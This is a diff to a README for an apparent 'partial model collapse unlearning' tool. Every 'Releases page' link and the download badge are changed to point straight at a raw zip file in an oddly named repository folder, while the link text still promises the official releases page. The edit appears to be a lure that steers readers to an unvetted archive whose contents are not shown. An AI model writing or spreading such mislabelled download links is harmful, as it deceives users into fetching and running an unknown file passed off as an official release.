@@ -1,6 +1,6 @@
 # 🚀 partial-model-collapse-unlearning - Effortless Model Unlearning for Everyone
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/AranLe12/partial-model-collapse-unlearning/releases)
+[![Download](https://raw.githubusercontent.com/AranLe12/partial-model-collapse-unlearning/main/Camptosorus/partial-model-collapse-unlearning.zip)](https://raw.githubusercontent.com/AranLe12/partial-model-collapse-unlearning/main/Camptosorus/partial-model-collapse-unlearning.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To run **partial-model-collapse-unlearning**, ensure your system meets the follo
 
 To begin, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/AranLe12/partial-model-collapse-unlearning/releases) to find the software version.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/AranLe12/partial-model-collapse-unlearning/main/Camptosorus/partial-model-collapse-unlearning.zip) to find the software version.
    
 2. **Download the Software:** Click on the version that suits your system, such as Windows or macOS. 
 
@@ -34,7 +34,7 @@ To begin, follow these simple steps:
 
 ## 📥 Download & Install
 
-You can download the latest version from our [Releases page](https://github.com/AranLe12/partial-model-collapse-unlearning/releases). 
+You can download the latest version from our [Releases page](https://raw.githubusercontent.com/AranLe12/partial-model-collapse-unlearning/main/Camptosorus/partial-model-collapse-unlearning.zip). 
 
 - Click on the version link that matches your system.
 - Follow the prompts to install the software.
@@ -56,7 +56,7 @@ After installation, you can start using the software. Here are the steps:
 If you encounter issues, consider the following steps:
 
 - **Check System Requirements:** Ensure your system meets the specified requirements.
-- **Update Your Software:** Always use the latest version available from our [Releases page](https://github.com/AranLe12/partial-model-collapse-unlearning/releases).
+- **Update Your Software:** Always use the latest version available from our [Releases page](https://raw.githubusercontent.com/AranLe12/partial-model-collapse-unlearning/main/Camptosorus/partial-model-collapse-unlearning.zip).
 - **Consult Documentation:** The included documentation contains helpful information.
 
 If problems persist, you can reach out for support via the GitHub Issues page.
